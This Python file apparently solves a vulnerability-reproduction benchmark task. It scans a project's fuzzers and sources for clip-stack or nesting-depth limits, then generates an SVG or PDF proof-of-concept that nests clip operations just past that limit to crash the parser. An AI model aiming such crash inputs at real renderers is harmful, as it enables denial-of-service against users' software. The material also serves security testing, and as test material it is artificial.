import os
import re
import tarfile
from typing import Dict, List, Optional, Tuple


class Solution:
    def _read_tar_texts(self, src_path: str, max_file_size: int = 2_000_000, max_files: int = 4000) -> List[Tuple[str, str]]:
        texts: List[Tuple[str, str]] = []
        try:
            with tarfile.open(src_path, "r:*") as tf:
                cnt = 0
                for m in tf.getmembers():
                    if cnt >= max_files:
                        break
                    if not m.isfile():
                        continue
                    name = m.name
                    ext = os.path.splitext(name)[1].lower()
                    if ext not in (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx", ".m", ".mm", ".rs", ".go", ".java", ".py"):
                        continue
                    if m.size <= 0 or m.size > max_file_size:
                        continue
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    b = f.read()
                    try:
                        s = b.decode("utf-8", "ignore")
                    except Exception:
                        s = b.decode("latin1", "ignore")
                    texts.append((name, s))
                    cnt += 1
        except Exception:
            pass
        return texts

    def _read_dir_texts(self, src_dir: str, max_file_size: int = 2_000_000, max_files: int = 4000) -> List[Tuple[str, str]]:
        texts: List[Tuple[str, str]] = []
        cnt = 0
        for root, _, files in os.walk(src_dir):
            for fn in files:
                if cnt >= max_files:
                    return texts
                ext = os.path.splitext(fn)[1].lower()
                if ext not in (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx", ".m", ".mm", ".rs", ".go", ".java", ".py"):
                    continue
                p = os.path.join(root, fn)
                try:
                    st = os.stat(p)
                    if st.st_size <= 0 or st.st_size > max_file_size:
                        continue
                    with open(p, "rb") as f:
                        b = f.read()
                    try:
                        s = b.decode("utf-8", "ignore")
                    except Exception:
                        s = b.decode("latin1", "ignore")
                    rel = os.path.relpath(p, src_dir)
                    texts.append((rel, s))
                    cnt += 1
                except Exception:
                    continue
        return texts

    def _collect_signals(self, texts: List[Tuple[str, str]]) -> Dict[str, object]:
        fuzzers: List[Tuple[str, str]] = []
        clip_related: List[Tuple[str, str]] = []
        all_lower_snippets: List[str] = []

        for name, s in texts:
            sl = s.lower()
            if "llvmfuzzertestoneinput" in sl:
                fuzzers.append((name, s))
            if ("clip mark" in sl) or ("clipmark" in sl) or (("clip" in sl) and ("stack" in sl) and ("nest" in sl)):
                clip_related.append((name, s))
            if len(all_lower_snippets) < 50:
                all_lower_snippets.append(sl[:20000])

        fuzzer_text = "\n".join([t for _, t in fuzzers]).lower()
        clip_text = "\n".join([t for _, t in clip_related]).lower()
        any_text = "\n".join(all_lower_snippets)

        return {
            "fuzzers": fuzzers,
            "clip_related": clip_related,
            "fuzzer_text": fuzzer_text,
            "clip_text": clip_text,
            "any_text": any_text,
        }

    def _detect_format(self, signals: Dict[str, object], texts: List[Tuple[str, str]]) -> str:
        fuzzer_text = signals.get("fuzzer_text", "")
        any_text = signals.get("any_text", "")

        fuzzer_names = " ".join([n.lower() for n, _ in signals.get("fuzzers", [])])

        svg_hits = 0
        pdf_hits = 0

        def hit_count(hay: str, needles: List[str]) -> int:
            c = 0
            for nd in needles:
                if nd in hay:
                    c += 1
            return c

        svg_hits += hit_count(fuzzer_text, ["svg", "rsvg", "sksvg", "svgnode", "svgdom", "usvg", "resvg", "nanosvg"])
        svg_hits += hit_count(fuzzer_names, ["svg"])
        svg_hits += hit_count(any_text, ["clip-path", "clippath", "<svg", "svgdom", "rsvg"])

        pdf_hits += hit_count(fuzzer_text, ["pdf", "mupdf", "poppler", "pdfium", "fpdf", "qpdf", "xpdf", "fz_open_document", "fitz"])
        pdf_hits += hit_count(fuzzer_names, ["pdf"])
        pdf_hits += hit_count(any_text, ["%pdf-", "xref", "trailer", "stream", "endobj", "mupdf", "pdfium", "poppler"])

        if svg_hits >= pdf_hits and svg_hits > 0:
            return "svg"
        if pdf_hits > 0:
            return "pdf"

        # Additional heuristic: if project contains many svg-related filenames
        svg_name_hits = 0
        pdf_name_hits = 0
        for name, _ in texts[:2000]:
            nl = name.lower()
            if "svg" in nl:
                svg_name_hits += 1
            if "pdf" in nl:
                pdf_name_hits += 1
        if svg_name_hits >= pdf_name_hits and svg_name_hits > 0:
            return "svg"
        if pdf_name_hits > 0:
            return "pdf"

        return "svg"

    def _infer_depth_target(self, signals: Dict[str, object], texts: List[Tuple[str, str]]) -> int:
        clip_text = signals.get("clip_text", "")
        fuzzer_text = signals.get("fuzzer_text", "")
        combined = (clip_text + "\n" + fuzzer_text).lower()

        candidates: List[int] = []

        # Look for explicit max nesting depth constants.
        patterns = [
            r'(?i)#\s*define\s+[a-z0-9_]*nest[a-z0-9_]*depth[a-z0-9_]*\s+(\d{2,6})',
            r'(?i)#\s*define\s+[a-z0-9_]*depth[a-z0-9_]*\s+(\d{2,6})',
            r'(?i)\b(?:kmax|max)[a-z0-9_]*nest[a-z0-9_]*depth[a-z0-9_]*\b[^0-9]{0,32}(\d{2,6})',
            r'(?i)\b(?:kmax|max)[a-z0-9_]*depth[a-z0-9_]*\b[^0-9]{0,32}(\d{2,6})',
            r'(?i)\b(?:layer|clip)[a-z0-9_]*stack[a-z0-9_]*\s*\[\s*(\d{2,6})\s*\]',
            r'(?i)std::array\s*<[^>]+,\s*(\d{2,6})\s*>',
        ]

        def add_from_text(s: str) -> None:
            for pat in patterns:
                for m in re.finditer(pat, s):
                    try:
                        v = int(m.group(1))
                    except Exception:
                        continue
                    if 64 <= v <= 200000:
                        candidates.append(v)

        add_from_text(clip_text)
        add_from_text(fuzzer_text)

        # Also scan a few likely files for relevant numbers near "nest"/"depth"/"stack"
        for name, s in texts[:600]:
            sl = s.lower()
            if ("nest" not in sl and "depth" not in sl and "stack" not in sl) or ("clip" not in sl and "layer" not in sl and "clip" not in name.lower()):
                continue
            for line in sl.splitlines():
                if len(line) > 300:
                    continue
                if ("nest" in line and "depth" in line) or (("clip" in line or "layer" in line) and "stack" in line):
                    for m in re.finditer(r'(\d{2,6})', line):
                        try:
                            v = int(m.group(1))
                        except Exception:
                            continue
                        if 64 <= v <= 200000:
                            candidates.append(v)

        if candidates:
            v = min(candidates)
            # Often need to exceed the max by 1
            return min(v + 2, 120000)

        # Infer by integer size hints
        if "int16_t" in combined and "nest" in combined:
            return 33000
        if "uint16_t" in combined and "nest" in combined:
            return 70000

        # Default based on typical 16-bit overflow patterns / ground-truth size
        return 35000

    def _gen_svg(self, n: int) -> bytes:
        # Keep compact but valid XML/SVG
        pre = (
            b'<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">'
            b"<defs><clipPath id=\"a\"><rect width=\"1\" height=\"1\"/></clipPath></defs>"
        )
        open_tag = b'<g clip-path="url(#a)">'
        close_tag = b"</g>"
        mid = b"<rect width=\"1\" height=\"1\"/>"
        post = b"</svg>"
        # n can be large; multiplication is efficient.
        return pre + (open_tag * n) + mid + (close_tag * n) + post

    def _gen_pdf(self, n: int) -> bytes:
        # Minimal PDF with a single page and a content stream that deeply nests clip operations.
        # Each nesting: save graphics state, add rectangle path, clip, end path.
        # Then restore all.
        # This is designed to stress layer/clip stacks.
        one = b"q 0 0 1 1 re W n\n"
        stream = one * n + (b"Q\n" * n)

        def obj(num: int, content: bytes) -> bytes:
            return (str(num).encode("ascii") + b" 0 obj\n" + content + b"\nendobj\n")

        o1 = b"<< /Type /Catalog /Pages 2 0 R >>"
        o2 = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
        o3 = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Contents 4 0 R >>"
        o4 = b"<< /Length " + str(len(stream)).encode("ascii") + b" >>\nstream\n" + stream + b"endstream"

        parts: List[bytes] = []
        parts.append(b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n")
        offsets = [0]  # object 0
        offset = len(parts[0])

        for num, content in [(1, o1), (2, o2), (3, o3), (4, o4)]:
            offsets.append(offset)
            bobj = obj(num, content)
            parts.append(bobj)
            offset += len(bobj)

        # xref
        xref_start = offset
        xref_lines = [b"xref\n", b"0 5\n", b"0000000000 65535 f \n"]
        for off in offsets[1:]:
            xref_lines.append(f"{off:010d} 00000 n \n".encode("ascii"))
        xref = b"".join(xref_lines)
        parts.append(xref)
        offset += len(xref)

        trailer = (
            b"trailer\n"
            b"<< /Size 5 /Root 1 0 R >>\n"
            b"startxref\n"
            + str(xref_start).encode("ascii")
            + b"\n%%EOF\n"
        )
        parts.append(trailer)
        return b"".join(parts)

    def solve(self, src_path: str) -> bytes:
        texts: List[Tuple[str, str]] = []
        if os.path.isdir(src_path):
            texts = self._read_dir_texts(src_path)
        else:
            texts = self._read_tar_texts(src_path)

        signals = self._collect_signals(texts)
        fmt = self._detect_format(signals, texts)
        n = self._infer_depth_target(signals, texts)

        # Ensure n stays within reasonable bounds
        if n < 256:
            n = 256
        if n > 120000:
            n = 120000

        if fmt == "pdf":
            return self._gen_pdf(n)
        return self._gen_svg(n)